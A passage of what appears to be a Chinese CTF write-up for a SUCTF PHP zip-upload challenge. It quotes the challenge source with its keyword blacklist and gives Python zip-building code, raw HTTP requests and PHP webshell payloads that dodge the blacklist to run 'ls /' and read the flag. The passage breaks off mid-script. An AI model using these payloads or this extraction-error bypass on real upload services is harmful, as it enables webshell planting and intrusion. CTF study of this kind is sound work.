+<li>php Server漏洞，有[<a target="_blank" rel="noopener" href="https://blog.csdn.net/Kawakaze_JF/article/details/133046885]">https://blog.csdn.net/Kawakaze_JF/article/details/133046885]</a></li>
+<li>bp发包(要关掉content-length自动添加)<ol>
+<li>这里python受到了局限，需要用bp，下面是bp试图，\r\n是bp中显示出来的</li>
+</ol>
+</li>
+<li>注意点<ol>
+<li>这里需要使用kc1zs4.txt，不能是kc1zs4&#x2F;文件夹，也不能是php文件，文章里也有说</li>
+</ol>
+</li>
+</ol>
+ <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET /unzip.php HTTP/1.1\r\n</span><br><span class="line">Host: 127.0.0.1:5000\r\n</span><br><span class="line">\r\n</span><br><span class="line">\r\n</span><br><span class="line">GET /kc1zs4.txt HTTP/1.1\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>代码审计</p>
+<ol>
+<li>这里其实只需要上传一个php文件然后访问执行即可getshell</li>
+<li>现在的问题在于上传的文件extract出来后会重命名，爆破有点逆天了？还有别的方法吗(想不到了55)<ol>
+<li>idea1(其实就是idea3嘻嘻): extractTo()是一个一个解压还是啥，这里失败后并没有返回，后续仍然会移动到upload&#x2F;suimages&#x2F;下</li>
+<li>idea2: 软连接，似乎可以用..&#x2F;l来绕过吧，可以本地试试，php这个函数似乎有版本限制，试的话要挺久，搜不到再回来试一试吧</li>
+<li>idea3: 找找资料: php zip ctf[<a target="_blank" rel="noopener" href="https://ucasers.cn/zip%E5%9C%A8CTF-web%E6%96%B9%E5%90%91%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E7%94%A8%E6%B3%95]%EF%BC%8C%E8%BF%99%E7%AF%87%E6%90%9CextractTo()%EF%BC%8Ctitle-9%E8%BF%99%E9%87%8C%E7%9A%84%E6%8F%8F%E8%BF%B0%E5%BE%88%E7%AC%A6%E5%90%88%EF%BC%8Cok%E7%9A%84%EF%BC%8C%E6%8A%A5%E9%94%99%E7%9A%84%E4%B9%9F%E5%8F%AF%E4%BB%A5%E6%96%87%E4%BB%B6%E5%90%8D%E5%81%9A%E6%96%87%E7%AB%A0">https://ucasers.cn/zip在CTF-web方向中的一些用法]，这篇搜extractTo()，title-9这里的描述很符合，ok的，报错的也可以文件名做文章</a></li>
+<li>idea4: 再check_extension和file_rename中使得unlink出错保留下来文件emm</li>
+</ol>
+</li>
+</ol>
+ <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: Nbc</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Date</span>: 2025-01-13 16:13:46</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@LastEditors</span>: Nbc</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@LastEditTime</span>: 2025-01-13 16:31:53</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@FilePath</span>: \src\unzip.php</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Description</span>: </span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * Copyright (c) 2025 by Nbc, All Rights Reserved. </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_extension</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$filename</span>, PATHINFO_EXTENSION);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_extension</span>(<span class="params"><span class="variable">$filename</span>,<span class="variable">$path</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filePath</span> = <span class="variable">$path</span> . DIRECTORY_SEPARATOR . <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_file</span>(<span class="variable">$filePath</span>)) &#123;</span><br><span class="line">        <span class="variable">$extension</span> = <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">get_extension</span>(<span class="variable">$filename</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 不能上传图片</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$extension</span>, [<span class="string">&#x27;jpg&#x27;</span>, <span class="string">&#x27;jpeg&#x27;</span>, <span class="string">&#x27;png&#x27;</span>, <span class="string">&#x27;gif&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">unlink</span>(<span class="variable">$filePath</span>)) &#123;</span><br><span class="line">                <span class="comment">// echo &quot;Fail to delete file: $filename\n&quot;;</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">// echo &quot;This file format is not supported:$extension\n&quot;;</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">// echo &quot;nofile&quot;;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">file_rename</span> (<span class="params"><span class="variable">$path</span>,<span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$randomName</span> = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">uniqid</span>().<span class="title function_ invoke__">rand</span>(<span class="number">0</span>, <span class="number">99999</span>)) . <span class="string">&#x27;.&#x27;</span> . <span class="title function_ invoke__">get_extension</span>(<span class="variable">$file</span>);</span><br><span class="line">                <span class="variable">$oldPath</span> = <span class="variable">$path</span> . DIRECTORY_SEPARATOR . <span class="variable">$file</span>;</span><br><span class="line">                <span class="variable">$newPath</span> = <span class="variable">$path</span> . DIRECTORY_SEPARATOR . <span class="variable">$randomName</span>;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 随机名称，但是还是可以爆破来的，目录的话有点难搞</span></span><br><span class="line">                <span class="keyword">if</span> (!<span class="title function_ invoke__">rename</span>(<span class="variable">$oldPath</span>, <span class="variable">$newPath</span>)) &#123;</span><br><span class="line">                    <span class="title function_ invoke__">unlink</span>(<span class="variable">$path</span> . DIRECTORY_SEPARATOR . <span class="variable">$file</span>);</span><br><span class="line">                    <span class="comment">// echo &quot;Fail to rename file: $file\n&quot;;</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">move_file</span>(<span class="params"><span class="variable">$path</span>,<span class="variable">$basePath</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="title function_ invoke__">glob</span>(<span class="variable">$path</span> . DIRECTORY_SEPARATOR . <span class="string">&#x27;*&#x27;</span>) <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">        <span class="variable">$destination</span> = <span class="variable">$basePath</span> . DIRECTORY_SEPARATOR . <span class="title function_ invoke__">basename</span>(<span class="variable">$file</span>);   <span class="comment">// 这个是可控的</span></span><br><span class="line">        <span class="comment">// 移动文件到指定目录</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">rename</span>(<span class="variable">$file</span>, <span class="variable">$destination</span>))&#123;</span><br><span class="line">            <span class="comment">// echo &quot;Fail to rename file: $file\n&quot;;</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_base</span>(<span class="params"><span class="variable">$fileContent</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$keywords</span> = [<span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;base64&#x27;</span>, <span class="string">&#x27;shell_exec&#x27;</span>, <span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;passthru&#x27;</span>, <span class="string">&#x27;assert&#x27;</span>, <span class="string">&#x27;flag&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;phar&#x27;</span>, <span class="string">&#x27;xml&#x27;</span>, <span class="string">&#x27;DOCTYPE&#x27;</span>, <span class="string">&#x27;iconv&#x27;</span>, <span class="string">&#x27;zip&#x27;</span>, <span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;chr&#x27;</span>, <span class="string">&#x27;hex2bin&#x27;</span>, <span class="string">&#x27;dir&#x27;</span>, <span class="string">&#x27;function&#x27;</span>, <span class="string">&#x27;pcntl_exec&#x27;</span>, <span class="string">&#x27;array&#x27;</span>, <span class="string">&#x27;include&#x27;</span>, <span class="string">&#x27;require&#x27;</span>, <span class="string">&#x27;call_user_func&#x27;</span>, <span class="string">&#x27;getallheaders&#x27;</span>, <span class="string">&#x27;get_defined_vars&#x27;</span>,<span class="string">&#x27;info&#x27;</span>];</span><br><span class="line">    <span class="variable">$base64_keywords</span> = [];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$keywords</span> <span class="keyword">as</span> <span class="variable">$keyword</span>) &#123;</span><br><span class="line">        <span class="variable">$base64_keywords</span>[] = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$keyword</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$base64_keywords</span> <span class="keyword">as</span> <span class="variable">$base64_keyword</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$fileContent</span>, <span class="variable">$base64_keyword</span>)!== <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_content</span>(<span class="params"><span class="variable">$zip</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$zip</span>-&gt;numFiles; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$fileInfo</span> = <span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">statIndex</span>(<span class="variable">$i</span>);</span><br><span class="line">        <span class="variable">$fileName</span> = <span class="variable">$fileInfo</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\.\.(\/|\.|%2e%2e%2f)/i&#x27;</span>, <span class="variable">$fileName</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>; </span><br><span class="line">        &#125;</span><br><span class="line">            <span class="comment">// echo &quot;Checking file: $fileName\n&quot;;</span></span><br><span class="line">            <span class="variable">$fileContent</span> = <span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">getFromName</span>(<span class="variable">$fileName</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment">// 似乎可以拼接，base64的也过滤了</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/(eval|base64|shell_exec|system|passthru|assert|flag|exec|phar|xml|DOCTYPE|iconv|zip|file|chr|hex2bin|dir|function|pcntl_exec|array|include|require|call_user_func|getallheaders|get_defined_vars|info)/i&#x27;</span>, <span class="variable">$fileContent</span>) || <span class="title function_ invoke__">check_base</span>(<span class="variable">$fileContent</span>)) &#123;</span><br><span class="line">                <span class="comment">// echo &quot;Don&#x27;t hack me!\n&quot;;    </span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">unzip</span>(<span class="params"><span class="variable">$zipname</span>, <span class="variable">$basePath</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$zip</span> = <span class="keyword">new</span> <span class="title class_">ZipArchive</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 是想要phar吗？用于执行命令的话，似乎不行</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$zipname</span>)) &#123;</span><br><span class="line">        <span class="comment">// echo &quot;Zip file does not exist&quot;;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;zip_not_found&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$zipname</span>)) &#123;</span><br><span class="line">        <span class="comment">// echo &quot;Fail to open zip file&quot;;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;zip_open_failed&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">check_content</span>(<span class="variable">$zip</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;malicious_content_detected&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 无法竞争，只能穿越？</span></span><br><span class="line">    <span class="variable">$randomDir</span> = <span class="string">&#x27;tmp_&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">uniqid</span>().<span class="title function_ invoke__">rand</span>(<span class="number">0</span>, <span class="number">99999</span>));</span><br><span class="line">    <span class="variable">$path</span> = <span class="variable">$basePath</span> . DIRECTORY_SEPARATOR . <span class="variable">$randomDir</span>;</span><br><span class="line">    <span class="comment">// 可以执行，可是访问不到啊</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">mkdir</span>(<span class="variable">$path</span>, <span class="number">0777</span>, <span class="literal">true</span>)) &#123;</span><br><span class="line">        <span class="comment">// echo &quot;Fail to create directory&quot;;</span></span><br><span class="line">        <span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;mkdir_failed&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 内置的函数</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">extractTo</span>(<span class="variable">$path</span>)) &#123;</span><br><span class="line">        <span class="comment">// echo &quot;Fail to extract zip file&quot;;</span></span><br><span class="line">        <span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">// 当且仅当提取成功时，才会检查文件</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$zip</span>-&gt;numFiles; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$fileInfo</span> = <span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">statIndex</span>(<span class="variable">$i</span>);</span><br><span class="line">            <span class="variable">$fileName</span> = <span class="variable">$fileInfo</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">check_extension</span>(<span class="variable">$fileName</span>, <span class="variable">$path</span>)) &#123;</span><br><span class="line">                <span class="comment">// echo &quot;Unsupported file extension&quot;;</span></span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">file_rename</span>(<span class="variable">$path</span>, <span class="variable">$fileName</span>)) &#123;</span><br><span class="line">                <span class="comment">// echo &quot;File rename failed&quot;;</span></span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 作用：移动文件到指定目录</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">move_file</span>(<span class="variable">$path</span>, <span class="variable">$basePath</span>)) &#123;</span><br><span class="line">        <span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">        <span class="comment">// echo &quot;Fail to move file&quot;;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;move_failed&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">rmdir</span>(<span class="variable">$path</span>);</span><br><span class="line">    <span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;    <span class="comment">// return true的一定走完了全流程</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$uploadDir</span> = <span class="keyword">__DIR__</span> . DIRECTORY_SEPARATOR . <span class="string">&#x27;upload/suimages/&#x27;</span>;    <span class="comment">// DIRECTORY_SEPARATOR是常量</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$uploadDir</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="variable">$uploadDir</span>, <span class="number">0777</span>, <span class="literal">true</span>);  <span class="comment">// 可执行可上传</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>]) &amp;&amp; <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;error&#x27;</span>] === UPLOAD_ERR_OK) &#123;</span><br><span class="line">    <span class="variable">$uploadedFile</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$zipname</span> = <span class="variable">$uploadedFile</span>[<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$path</span> = <span class="variable">$uploadDir</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用unzip，目录穿越，然后可以执行吗，这里的unzip不是内置的</span></span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">unzip</span>(<span class="variable">$zipname</span>, <span class="variable">$path</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$result</span> === <span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: index.html?status=success&quot;</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: index.html?status=<span class="subst">$result</span>&quot;</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: index.html?status=file_error&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>使用idea3上传一个zip文件，先读取一下poc一下，kc1zs4.txt</p>
+ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"></span><br><span class="line">mf = io.BytesIO()</span><br><span class="line"><span class="keyword">with</span> zipfile.ZipFile(mf, mode=<span class="string">&quot;w&quot;</span>, compression=zipfile.ZIP_STORED) <span class="keyword">as</span> zf:</span><br><span class="line">    zf.writestr(<span class="string">&#x27;kc1zs4.txt&#x27;</span>, <span class="string">b&#x27;hello kc1zs4&#x27;</span>)</span><br><span class="line">    zf.writestr(<span class="string">&#x27;A&#x27;</span>*<span class="number">5000</span>, <span class="string">b&#x27;AAAAA&#x27;</span>) <span class="comment"># 构造出错</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;kc1zs4.zip&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(mf.getvalue())</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li><p>ok，接下来写上shell了嘻嘻，直接访问得到，nice，绕黑名单，phpinfo看看有没有disable_functions，有的话就要绕过了</p>
+<ol>
+<li>emm，info也要绕过<code>zf.writestr(&#39;kc1zs4.php&#39;, b&#39;&lt;?php $a=&quot;phpinf&quot;;$b=&quot;o&quot;;$c=$a.$b;$c();&#39;)</code></li>
+<li>wc，确实有info，但是没有system()，搞笑呢？<ol>
+<li><code>zf.writestr(&#39;kc1zs4.php&#39;, b&#39;&lt;?php $a=&quot;syst&quot;;$b=&quot;em&quot;;$c=$a.$b;echo $c(&quot;l&quot;.&quot;s /&quot;);&#39;)</code></li>
+<li><code>zf.writestr(&#39;kc1zs4.php&#39;, b&#39;&lt;?php $a=&quot;syst&quot;;$b=&quot;em&quot;;$c=$a.$b;echo $c(&quot;ca&quot;.&quot;t /seef1ag_getfl4g&quot;);&#39;)</code></li>
+<li>SUCTF{sti1l_w0t3r_Run_d@@p!!!}</li>
+</ol>
+</li>
+<li>payload</li>
+</ol>
+  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">host=<span class="string">&quot;http://localhost:5000&quot;</span></span><br><span class="line">bp = &#123;</span><br><span class="line">    <span class="string">&quot;http&quot;</span>: <span class="string">&quot;http://localhost:8080&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="comment">### 生成zip文件</span></span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"></span><br><span class="line">mf = io.BytesIO()</span><br><span class="line"><span class="keyword">with</span> zipfile.ZipFile(mf, mode=<span class="string">&quot;w&quot;</span>, compression=zipfile.ZIP_STORED) <span class="keyword">as</span> zf:</span><br><span class="line">    <span class="comment"># phpinfo</span></span><br><span class="line">    <span class="comment"># zf.writestr(&#x27;kc1zs4.php&#x27;, b&#x27;&lt;?php $a=&quot;phpinf&quot;;$b=&quot;o&quot;;$c=$a.$b;$c();&#x27;)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># system()</span></span><br><span class="line">    <span class="comment"># zf.writestr(&#x27;kc1zs4.php&#x27;, b&#x27;&lt;?php $a=&quot;syst&quot;;$b=&quot;em&quot;;$c=$a.$b;echo $c(\&#x27;$_POST[&quot;kc1zs4&quot;]\&#x27;);&#x27;)</span></span><br><span class="line">    <span class="comment"># 